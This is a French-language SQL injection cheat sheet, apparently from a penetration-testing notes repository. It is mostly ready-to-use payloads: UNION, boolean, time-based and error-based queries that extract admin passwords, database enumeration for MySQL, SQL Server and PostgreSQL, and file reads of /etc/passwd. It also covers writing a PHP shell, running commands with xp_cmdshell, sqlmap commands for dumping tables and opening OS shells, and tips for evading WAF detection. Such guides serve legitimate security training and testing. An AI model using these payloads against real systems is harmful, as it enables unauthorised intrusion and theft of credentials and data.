# SQL Injection - Guide Complet

## üóÇÔ∏è Workflow d'exploitation SQL Injection
1. D√©tection des param√®tres vuln√©rables (', ", UNION, blind)
   ‚Üì
2. Identification du type de base de donn√©es (erreurs, fonctions)
   ‚Üì
3. √ânum√©ration de la structure (tables, colonnes, utilisateurs)
   ‚Üì
4. Extraction des donn√©es sensibles (credentials, donn√©es m√©tier)
   ‚Üì
5. √âl√©vation de privil√®ges (lecture/√©criture fichiers, ex√©cution code)
   ‚Üì
6. Post-exploitation (backdoors, persistance)

## üìã Vue d'ensemble

L'injection SQL est une vuln√©rabilit√© qui permet d'ex√©cuter des requ√™tes SQL arbitraires dans une base de donn√©es en manipulant les entr√©es utilisateur non filtr√©es.

> **üí° Explication Simple** : C'est comme glisser un faux message dans une conversation t√©l√©phonique. Au lieu de dire "Cherche l'utilisateur John", on fait dire √† l'application "Cherche l'utilisateur John' OU montre-moi tous les mots de passe".

## üîç D√©tection des Injections SQL

### Tests de base
```sql
-- Caract√®res de test simples
'
"
`
')
")
`)

-- Tests logiques
' OR 1=1--
" OR 1=1--
' OR 'a'='a
" OR "a"="a

-- Tests avec commentaires
' OR 1=1#
' OR 1=1/*
' OR 1=1-- -
```

### Tests par contexte
```sql
-- Dans un WHERE avec cha√Æne
admin' OR '1'='1
admin" OR "1"="1

-- Dans un WHERE num√©rique
1 OR 1=1
1 OR 1=1--

-- Dans un INSERT
', (SELECT password FROM users WHERE username='admin'))--

-- Dans un UPDATE
', password='newpass' WHERE username='admin'--
```

## üéØ Types d'Injections SQL

### Union-based SQL Injection
```sql
-- D√©terminer le nombre de colonnes
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (jusqu'√† erreur)

-- Ou avec NULL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

-- Identifier les colonnes affich√©es
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--

-- Extraction de donn√©es
' UNION SELECT username,password,NULL FROM users--
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
```

### Boolean-based Blind SQL Injection
```sql
-- Test de base
' AND 1=1--     (page normale)
' AND 1=2--     (page diff√©rente)

-- Test de longueur
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=5--
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=6--

-- Extraction caract√®re par caract√®re
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='b'--

-- Avec ASCII
' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')=97--
```

### Time-based Blind SQL Injection
```sql
-- Tests de d√©lai
' AND SLEEP(5)--                    (MySQL)
' AND WAITFOR DELAY '00:00:05'--    (SQL Server)
' AND pg_sleep(5)--                 (PostgreSQL)

-- Extraction conditionnelle avec d√©lai
' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--

-- PostgreSQL
' AND CASE WHEN (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Error-based SQL Injection
```sql
-- MySQL
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)))--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--

-- SQL Server
' AND CONVERT(int,(SELECT @@version))--
' AND CAST((SELECT @@version) AS int)--

-- PostgreSQL
' AND CAST((SELECT version()) AS int)--
```

## üóÉÔ∏è √ânum√©ration de Base de Donn√©es

### Identification du SGBD
```sql
-- Tests de fonctions sp√©cifiques
SELECT version()        -- MySQL, PostgreSQL
SELECT @@version        -- SQL Server
SELECT sqlite_version() -- SQLite

-- Tests d'erreurs caract√©ristiques
'                       -- Syntaxe g√©n√©rale
' AND 1=CONVERT(int,@@version)--  -- SQL Server
' AND 1=version()--              -- PostgreSQL/MySQL
```

### MySQL
```sql
-- Informations syst√®me
SELECT version()
SELECT user()
SELECT database()
SELECT @@hostname

-- √ânum√©ration des bases
SELECT schema_name FROM information_schema.schemata

-- √ânum√©ration des tables
SELECT table_name FROM information_schema.tables WHERE table_schema='database_name'

-- √ânum√©ration des colonnes
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Extraction de donn√©es
SELECT username,password FROM users
SELECT load_file('/etc/passwd')
SELECT 'content' INTO OUTFILE '/var/www/shell.php'
```

### SQL Server
```sql
-- Informations syst√®me
SELECT @@version
SELECT SYSTEM_USER
SELECT DB_NAME()
SELECT HOST_NAME()

-- √ânum√©ration des bases
SELECT name FROM sys.databases

-- √ânum√©ration des tables
SELECT name FROM sys.tables

-- √ânum√©ration des colonnes
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('users')

-- Lecture de fichiers
SELECT BulkColumn FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS Contents

-- Ex√©cution de commandes (si xp_cmdshell activ√©)
EXEC xp_cmdshell 'whoami'
```

### PostgreSQL
```sql
-- Informations syst√®me
SELECT version()
SELECT current_user
SELECT current_database()

-- √ânum√©ration des bases
SELECT datname FROM pg_database

-- √ânum√©ration des tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- √ânum√©ration des colonnes
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Lecture de fichiers
SELECT pg_read_file('/etc/passwd')

-- √âcriture de fichiers
COPY (SELECT 'content') TO '/tmp/test.txt'
```

## üîß Outils d'Exploitation

### SQLMap
```bash
# D√©tection automatique
sqlmap -u "http://target.com/page?id=1" --dbs

# Avec donn√©es POST
sqlmap -u "http://target.com/login" --data="username=admin&password=pass" -p password

# Avec cookies
sqlmap -u "http://target.com/page?id=1" --cookie="SESSIONID=abc123"

# Dump d'une base sp√©cifique
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Dump d'une table sp√©cifique
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Shell interactif
sqlmap -u "http://target.com/page?id=1" --os-shell

# Lecture de fichiers
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
```

### Tests manuels avec curl
```bash
# Test GET
curl "http://target.com/page?id=1' OR 1=1--"

# Test POST
curl -X POST -d "username=admin' OR 1=1--&password=test" http://target.com/login

# Avec headers personnalis√©s
curl -H "X-Forwarded-For: 1.1.1.1' OR 1=1--" http://target.com/page
```

## üõ°Ô∏è Conseils OPSEC
- Utiliser sqlmap avec les options --delay et --safe-url pour √©viter la d√©tection
- Fragmenter les requ√™tes d'extraction pour √©viter les alertes
- Utiliser des WAF bypass techniques quand n√©cessaire
- Ne jamais modifier ou supprimer des donn√©es sans autorisation explicite
- Documenter tous les payloads utilis√©s pour la reproductibilit√©

## ‚ö†Ô∏è Erreurs fr√©quentes
- Oublier de tester tous les param√®tres (GET, POST, headers, cookies)
- Ne pas identifier correctement le type de SGBD avant l'exploitation
- Utiliser sqlmap trop agressivement (d√©tectable par les WAF)
- Ignorer les injections blind (plus discr√®tes mais souvent pr√©sentes)
- Ne pas v√©rifier les privil√®ges avant de tenter l'√©l√©vation

## üí° Astuces
- Combiner tests manuels et automatis√©s (sqlmap apr√®s identification manuelle)
- Utiliser les commentaires SQL appropri√©s selon le SGBD (-- vs # vs /**/)
- Tester les injections dans les en-t√™tes HTTP (User-Agent, X-Forwarded-For)
- Chercher les param√®tres cach√©s avec Burp Param Miner
- Utiliser les time-based quand les autres m√©thodes √©chouent

## üîó Pour aller plus loin
- [SQLMap Documentation](https://sqlmap.org/)
- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks - SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

## üß≠ Navigation
- [Guide XSS](./XSS.md)
- [Guide LFI/RFI](./LFI_RFI.md)
- [Retour aux applications web](./README.md) 